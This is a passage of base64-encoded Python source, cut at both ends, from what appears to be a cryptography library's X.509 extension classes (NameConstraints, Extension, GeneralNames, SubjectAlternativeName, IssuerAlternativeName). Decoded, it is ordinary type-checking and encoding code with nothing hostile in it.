mxlW0dlbmVyYWxOYW1lXV0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgcGVybWl0dGVkX3N1YnRyZWVzIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBwZXJtaXR0ZWRfc3VidHJlZXMgPSBsaXN0KHBlcm1pdHRlZF9zdWJ0cmVlcylcclxuICAgICAgICAgICAgaWYgbm90IHBlcm1pdHRlZF9zdWJ0cmVlczpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgInBlcm1pdHRlZF9zdWJ0cmVlcyBtdXN0IGJlIGEgbm9uLWVtcHR5IGxpc3Qgb3IgTm9uZSJcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgaWYgbm90IGFsbChpc2luc3RhbmNlKHgsIEdlbmVyYWxOYW1lKSBmb3IgeCBpbiBwZXJtaXR0ZWRfc3VidHJlZXMpOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJwZXJtaXR0ZWRfc3VidHJlZXMgbXVzdCBiZSBhIGxpc3Qgb2YgR2VuZXJhbE5hbWUgb2JqZWN0cyAiXHJcbiAgICAgICAgICAgICAgICAgICAgIm9yIE5vbmUiXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICBzZWxmLl92YWxpZGF0ZV9pcF9uYW1lKHBlcm1pdHRlZF9zdWJ0cmVlcylcclxuXHJcbiAgICAgICAgaWYgZXhjbHVkZWRfc3VidHJlZXMgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGV4Y2x1ZGVkX3N1YnRyZWVzID0gbGlzdChleGNsdWRlZF9zdWJ0cmVlcylcclxuICAgICAgICAgICAgaWYgbm90IGV4Y2x1ZGVkX3N1YnRyZWVzOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiZXhjbHVkZWRfc3VidHJlZXMgbXVzdCBiZSBhIG5vbi1lbXB0eSBsaXN0IG9yIE5vbmUiXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGlmIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBHZW5lcmFsTmFtZSkgZm9yIHggaW4gZXhjbHVkZWRfc3VidHJlZXMpOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJleGNsdWRlZF9zdWJ0cmVlcyBtdXN0IGJlIGEgbGlzdCBvZiBHZW5lcmFsTmFtZSBvYmplY3RzICJcclxuICAgICAgICAgICAgICAgICAgICAib3IgTm9uZSJcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgIHNlbGYuX3ZhbGlkYXRlX2lwX25hbWUoZXhjbHVkZWRfc3VidHJlZXMpXHJcblxyXG4gICAgICAgIGlmIHBlcm1pdHRlZF9zdWJ0cmVlcyBpcyBOb25lIGFuZCBleGNsdWRlZF9zdWJ0cmVlcyBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkF0IGxlYXN0IG9uZSBvZiBwZXJtaXR0ZWRfc3VidHJlZXMgYW5kIGV4Y2x1ZGVkX3N1YnRyZWVzICJcclxuICAgICAgICAgICAgICAgICJtdXN0IG5vdCBiZSBOb25lIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3Blcm1pdHRlZF9zdWJ0cmVlcyA9IHBlcm1pdHRlZF9zdWJ0cmVlc1xyXG4gICAgICAgIHNlbGYuX2V4Y2x1ZGVkX3N1YnRyZWVzID0gZXhjbHVkZWRfc3VidHJlZXNcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIE5hbWVDb25zdHJhaW50cyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLmV4Y2x1ZGVkX3N1YnRyZWVzID09IG90aGVyLmV4Y2x1ZGVkX3N1YnRyZWVzXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLnBlcm1pdHRlZF9zdWJ0cmVlcyA9PSBvdGhlci5wZXJtaXR0ZWRfc3VidHJlZXNcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF92YWxpZGF0ZV9pcF9uYW1lKHNlbGYsIHRyZWU6IHR5cGluZy5JdGVyYWJsZVtHZW5lcmFsTmFtZV0pIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgYW55KFxyXG4gICAgICAgICAgICBpc2luc3RhbmNlKG5hbWUsIElQQWRkcmVzcylcclxuICAgICAgICAgICAgYW5kIG5vdCBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICAgICAgbmFtZS52YWx1ZSwgKGlwYWRkcmVzcy5JUHY0TmV0d29yaywgaXBhZGRyZXNzLklQdjZOZXR3b3JrKVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGZvciBuYW1lIGluIHRyZWVcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiSVBBZGRyZXNzIG5hbWUgY29uc3RyYWludHMgbXVzdCBiZSBhbiBJUHY0TmV0d29yayBvciJcclxuICAgICAgICAgICAgICAgICIgSVB2Nk5ldHdvcmsgb2JqZWN0IlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICAiPE5hbWVDb25zdHJhaW50cyhwZXJtaXR0ZWRfc3VidHJlZXM9ezAucGVybWl0dGVkX3N1YnRyZWVzfSwgIlxyXG4gICAgICAgICAgICAiZXhjbHVkZWRfc3VidHJlZXM9ezAuZXhjbHVkZWRfc3VidHJlZXN9KT4iLmZvcm1hdChzZWxmKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIGlmIHNlbGYucGVybWl0dGVkX3N1YnRyZWVzIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBwczogdHlwaW5nLk9wdGlvbmFsW3R5cGluZy5UdXBsZVtHZW5lcmFsTmFtZSwgLi4uXV0gPSB0dXBsZShcclxuICAgICAgICAgICAgICAgIHNlbGYucGVybWl0dGVkX3N1YnRyZWVzXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBwcyA9IE5vbmVcclxuXHJcbiAgICAgICAgaWYgc2VsZi5leGNsdWRlZF9zdWJ0cmVlcyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgZXM6IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuVHVwbGVbR2VuZXJhbE5hbWUsIC4uLl1dID0gdHVwbGUoXHJcbiAgICAgICAgICAgICAgICBzZWxmLmV4Y2x1ZGVkX3N1YnRyZWVzXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBlcyA9IE5vbmVcclxuXHJcbiAgICAgICAgcmV0dXJuIGhhc2goKHBzLCBlcykpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcGVybWl0dGVkX3N1YnRyZWVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuTGlzdFtHZW5lcmFsTmFtZV1dOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wZXJtaXR0ZWRfc3VidHJlZXNcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBleGNsdWRlZF9zdWJ0cmVlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgKSAtPiB0eXBpbmcuT3B0aW9uYWxbdHlwaW5nLkxpc3RbR2VuZXJhbE5hbWVdXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZXhjbHVkZWRfc3VidHJlZXNcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIEV4dGVuc2lvbih0eXBpbmcuR2VuZXJpY1tFeHRlbnNpb25UeXBlVmFyXSk6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgb2lkOiBPYmplY3RJZGVudGlmaWVyLCBjcml0aWNhbDogYm9vbCwgdmFsdWU6IEV4dGVuc2lvblR5cGVWYXJcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvaWQsIE9iamVjdElkZW50aWZpZXIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAib2lkIGFyZ3VtZW50IG11c3QgYmUgYW4gT2JqZWN0SWRlbnRpZmllciBpbnN0YW5jZS4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoY3JpdGljYWwsIGJvb2wpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImNyaXRpY2FsIG11c3QgYmUgYSBib29sZWFuIHZhbHVlIilcclxuXHJcbiAgICAgICAgc2VsZi5fb2lkID0gb2lkXHJcbiAgICAgICAgc2VsZi5fY3JpdGljYWwgPSBjcml0aWNhbFxyXG4gICAgICAgIHNlbGYuX3ZhbHVlID0gdmFsdWVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBvaWQoc2VsZikgLT4gT2JqZWN0SWRlbnRpZmllcjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb2lkXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY3JpdGljYWwoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY3JpdGljYWxcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB2YWx1ZShzZWxmKSAtPiBFeHRlbnNpb25UeXBlVmFyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl92YWx1ZVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgIjxFeHRlbnNpb24ob2lkPXswLm9pZH0sIGNyaXRpY2FsPXswLmNyaXRpY2FsfSwgIlxyXG4gICAgICAgICAgICAidmFsdWU9ezAudmFsdWV9KT4iXHJcbiAgICAgICAgKS5mb3JtYXQoc2VsZilcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIEV4dGVuc2lvbik6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLm9pZCA9PSBvdGhlci5vaWRcclxuICAgICAgICAgICAgYW5kIHNlbGYuY3JpdGljYWwgPT0gb3RoZXIuY3JpdGljYWxcclxuICAgICAgICAgICAgYW5kIHNlbGYudmFsdWUgPT0gb3RoZXIudmFsdWVcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCgoc2VsZi5vaWQsIHNlbGYuY3JpdGljYWwsIHNlbGYudmFsdWUpKVxyXG5cclxuXHJcbmNsYXNzIEdlbmVyYWxOYW1lczpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBnZW5lcmFsX25hbWVzOiB0eXBpbmcuSXRlcmFibGVbR2VuZXJhbE5hbWVdKSAtPiBOb25lOlxyXG4gICAgICAgIGdlbmVyYWxfbmFtZXMgPSBsaXN0KGdlbmVyYWxfbmFtZXMpXHJcbiAgICAgICAgaWYgbm90IGFsbChpc2luc3RhbmNlKHgsIEdlbmVyYWxOYW1lKSBmb3IgeCBpbiBnZW5lcmFsX25hbWVzKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkV2ZXJ5IGl0ZW0gaW4gdGhlIGdlbmVyYWxfbmFtZXMgbGlzdCBtdXN0IGJlIGFuICJcclxuICAgICAgICAgICAgICAgICJvYmplY3QgY29uZm9ybWluZyB0byB0aGUgR2VuZXJhbE5hbWUgaW50ZXJmYWNlIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2dlbmVyYWxfbmFtZXMgPSBnZW5lcmFsX25hbWVzXHJcblxyXG4gICAgX19sZW5fXywgX19pdGVyX18sIF9fZ2V0aXRlbV9fID0gX21ha2Vfc2VxdWVuY2VfbWV0aG9kcygiX2dlbmVyYWxfbmFtZXMiKVxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBnZXRfdmFsdWVzX2Zvcl90eXBlKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdHlwZTogdHlwaW5nLlVuaW9uW1xyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtETlNOYW1lXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbVW5pZm9ybVJlc291cmNlSWRlbnRpZmllcl0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1JGQzgyMk5hbWVdLFxyXG4gICAgICAgIF0sXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQHR5cGluZy5vdmVybG9hZFxyXG4gICAgZGVmIGdldF92YWx1ZXNfZm9yX3R5cGUoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICB0eXBlOiB0eXBpbmcuVHlwZVtEaXJlY3RvcnlOYW1lXSxcclxuICAgICkgLT4gdHlwaW5nLkxpc3RbTmFtZV06XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQHR5cGluZy5vdmVybG9hZFxyXG4gICAgZGVmIGdldF92YWx1ZXNfZm9yX3R5cGUoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICB0eXBlOiB0eXBpbmcuVHlwZVtSZWdpc3RlcmVkSURdLFxyXG4gICAgKSAtPiB0eXBpbmcuTGlzdFtPYmplY3RJZGVudGlmaWVyXTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgZ2V0X3ZhbHVlc19mb3JfdHlwZShcclxuICAgICAgICBzZWxmLCB0eXBlOiB0eXBpbmcuVHlwZVtJUEFkZHJlc3NdXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W19JUEFERFJFU1NfVFlQRVNdOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBnZXRfdmFsdWVzX2Zvcl90eXBlKFxyXG4gICAgICAgIHNlbGYsIHR5cGU6IHR5cGluZy5UeXBlW090aGVyTmFtZV1cclxuICAgICkgLT4gdHlwaW5nLkxpc3RbT3RoZXJOYW1lXTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBkZWYgZ2V0X3ZhbHVlc19mb3JfdHlwZShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHR5cGU6IHR5cGluZy5VbmlvbltcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbRE5TTmFtZV0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW0RpcmVjdG9yeU5hbWVdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtJUEFkZHJlc3NdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtPdGhlck5hbWVdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtSRkM4MjJOYW1lXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbUmVnaXN0ZXJlZElEXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbVW5pZm9ybVJlc291cmNlSWRlbnRpZmllcl0sXHJcbiAgICAgICAgXSxcclxuICAgICkgLT4gdHlwaW5nLlVuaW9uW1xyXG4gICAgICAgIHR5cGluZy5MaXN0W19JUEFERFJFU1NfVFlQRVNdLFxyXG4gICAgICAgIHR5cGluZy5MaXN0W3N0cl0sXHJcbiAgICAgICAgdHlwaW5nLkxpc3RbT3RoZXJOYW1lXSxcclxuICAgICAgICB0eXBpbmcuTGlzdFtOYW1lXSxcclxuICAgICAgICB0eXBpbmcuTGlzdFtPYmplY3RJZGVudGlmaWVyXSxcclxuICAgIF06XHJcbiAgICAgICAgIyBSZXR1cm4gdGhlIHZhbHVlIG9mIGVhY2ggR2VuZXJhbE5hbWUsIGV4Y2VwdCBmb3IgT3RoZXJOYW1lIGluc3RhbmNlc1xyXG4gICAgICAgICMgd2hpY2ggd2UgcmV0dXJuIGRpcmVjdGx5IGJlY2F1c2UgaXQgaGFzIHR3byBpbXBvcnRhbnQgcHJvcGVydGllcyBub3RcclxuICAgICAgICAjIGp1c3Qgb25lIHZhbHVlLlxyXG4gICAgICAgIG9ianMgPSAoaSBmb3IgaSBpbiBzZWxmIGlmIGlzaW5zdGFuY2UoaSwgdHlwZSkpXHJcbiAgICAgICAgaWYgdHlwZSAhPSBPdGhlck5hbWU6XHJcbiAgICAgICAgICAgIHJldHVybiBbaS52YWx1ZSBmb3IgaSBpbiBvYmpzXVxyXG4gICAgICAgIHJldHVybiBsaXN0KG9ianMpXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxHZW5lcmFsTmFtZXMoe30pPiIuZm9ybWF0KHNlbGYuX2dlbmVyYWxfbmFtZXMpXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBHZW5lcmFsTmFtZXMpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2dlbmVyYWxfbmFtZXMgPT0gb3RoZXIuX2dlbmVyYWxfbmFtZXNcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHR1cGxlKHNlbGYuX2dlbmVyYWxfbmFtZXMpKVxyXG5cclxuXHJcbmNsYXNzIFN1YmplY3RBbHRlcm5hdGl2ZU5hbWUoRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuU1VCSkVDVF9BTFRFUk5BVElWRV9OQU1FXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGdlbmVyYWxfbmFtZXM6IHR5cGluZy5JdGVyYWJsZVtHZW5lcmFsTmFtZV0pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZ2VuZXJhbF9uYW1lcyA9IEdlbmVyYWxOYW1lcyhnZW5lcmFsX25hbWVzKVxyXG5cclxuICAgIF9fbGVuX18sIF9faXRlcl9fLCBfX2dldGl0ZW1fXyA9IF9tYWtlX3NlcXVlbmNlX21ldGhvZHMoIl9nZW5lcmFsX25hbWVzIilcclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgZ2V0X3ZhbHVlc19mb3JfdHlwZShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHR5cGU6IHR5cGluZy5VbmlvbltcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbRE5TTmFtZV0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1VuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXJdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtSRkM4MjJOYW1lXSxcclxuICAgICAgICBdLFxyXG4gICAgKSAtPiB0eXBpbmcuTGlzdFtzdHJdOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBnZXRfdmFsdWVzX2Zvcl90eXBlKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdHlwZTogdHlwaW5nLlR5cGVbRGlyZWN0b3J5TmFtZV0sXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W05hbWVdOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBnZXRfdmFsdWVzX2Zvcl90eXBlKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdHlwZTogdHlwaW5nLlR5cGVbUmVnaXN0ZXJlZElEXSxcclxuICAgICkgLT4gdHlwaW5nLkxpc3RbT2JqZWN0SWRlbnRpZmllcl06XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQHR5cGluZy5vdmVybG9hZFxyXG4gICAgZGVmIGdldF92YWx1ZXNfZm9yX3R5cGUoXHJcbiAgICAgICAgc2VsZiwgdHlwZTogdHlwaW5nLlR5cGVbSVBBZGRyZXNzXVxyXG4gICAgKSAtPiB0eXBpbmcuTGlzdFtfSVBBRERSRVNTX1RZUEVTXTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgZ2V0X3ZhbHVlc19mb3JfdHlwZShcclxuICAgICAgICBzZWxmLCB0eXBlOiB0eXBpbmcuVHlwZVtPdGhlck5hbWVdXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W090aGVyTmFtZV06XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgZGVmIGdldF92YWx1ZXNfZm9yX3R5cGUoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICB0eXBlOiB0eXBpbmcuVW5pb25bXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW0ROU05hbWVdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtEaXJlY3RvcnlOYW1lXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbSVBBZGRyZXNzXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbT3RoZXJOYW1lXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbUkZDODIyTmFtZV0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1JlZ2lzdGVyZWRJRF0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1VuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXJdLFxyXG4gICAgICAgIF0sXHJcbiAgICApIC0+IHR5cGluZy5VbmlvbltcclxuICAgICAgICB0eXBpbmcuTGlzdFtfSVBBRERSRVNTX1RZUEVTXSxcclxuICAgICAgICB0eXBpbmcuTGlzdFtzdHJdLFxyXG4gICAgICAgIHR5cGluZy5MaXN0W090aGVyTmFtZV0sXHJcbiAgICAgICAgdHlwaW5nLkxpc3RbTmFtZV0sXHJcbiAgICAgICAgdHlwaW5nLkxpc3RbT2JqZWN0SWRlbnRpZmllcl0sXHJcbiAgICBdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9nZW5lcmFsX25hbWVzLmdldF92YWx1ZXNfZm9yX3R5cGUodHlwZSlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPFN1YmplY3RBbHRlcm5hdGl2ZU5hbWUoe30pPiIuZm9ybWF0KHNlbGYuX2dlbmVyYWxfbmFtZXMpXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBTdWJqZWN0QWx0ZXJuYXRpdmVOYW1lKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9nZW5lcmFsX25hbWVzID09IG90aGVyLl9nZW5lcmFsX25hbWVzXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaChzZWxmLl9nZW5lcmFsX25hbWVzKVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgSXNzdWVyQWx0ZXJuYXRpdmVOYW1lKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gRXh0ZW5zaW9uT0lELklTU1VFUl9BTFRFUk5BVElWRV9OQU1FXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGdlbmVyYWxfbmFtZXM6IHR5cGluZy5JdGVyYWJsZVtHZW5lcmFsTmFtZV0pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZ2VuZXJhbF9uYW1lcyA9IEdlbmVyYWxOYW1lcyhnZW5lcmFsX25hbWVzKVxyXG5cclxuICAgIF9fbGVuX18sIF9faXRlcl9fLCBfX2dldGl0ZW1fXyA9IF9tYWtlX3NlcXVlbmNlX21ldGhvZHMoIl9nZW5lcmFsX25hbWVzIilcclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgZ2V0X3ZhbHVlc19mb3JfdHlwZShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHR5cGU6IHR5cGluZy5VbmlvbltcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbRE5TTmFtZV0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1VuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXJdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtSRkM4MjJOYW1lXSxcclxuICAgICAgICBdLFxyXG4gICAgKSAtPiB0eXBpbmcuTGlzdFtzdHJdOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBnZXRfdmFsdWVzX2Zvcl90eXBlKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdHlwZTogdHlwaW5nLlR5cGVbRGlyZWN0b3J5TmFtZV0sXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W05hbWVdOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBnZXRfdmFsdWVzX2Zvcl90eXBlKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdHlwZTogdHlwaW5nLlR5cGVbUmVnaXN0ZXJlZElEXSxcclxuICAgICkgLT4gdHlwaW5nLkxpc3RbT2JqZWN0SWRlbnRpZmllcl06XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQHR5cGluZy5vdmVybG9hZFxyXG4gICAgZGVmIGdldF92YWx1ZXNfZm9yX3R5cGUoXHJcbiAgICAgICAgc2VsZiwgdHlwZTogdHlwaW5nLlR5cGVbSVBBZGRyZXNzXVxyXG4gICAgKSAtPiB0eXBpbmcuTGlzdFtfSVBBRERSRVNTX1RZUEVTXTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgZ2V0X3ZhbHVlc19mb3JfdHlwZShcclxuICAgICAgICBzZWxmLCB0eXBlOiB0eXBpbmcuVHlwZVtPdGhlck5hbWVdXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W090aGVyTmFtZV06XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgZGVmIGdldF92YWx1ZXNfZm9yX3R5cGUoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICB0eXBlOiB0eXBpbmcuVW5pb25bXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW0ROU05hbWVdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtEaXJlY3RvcnlOYW1lXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbSVBBZGRyZXNzXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbT3RoZXJOYW1lXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbUkZDODIyTmFtZV0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1JlZ2lzdGVyZWRJRF0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1VuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXJdLFxyXG4gICAgICAgIF0sXHJcbiAgICApIC0+IHR5cGluZy5VbmlvbltcclxuICAgICAgICB0eXBpbmcuTGlzdFtfSVBBRERSRVNTX1RZUEVTXSxcclxuICAgICAgICB0eXBpbmcuTGlzdFtzdHJdLFxyXG4gICAgICAgIHR5cGluZy5MaXN0W090aGVyTm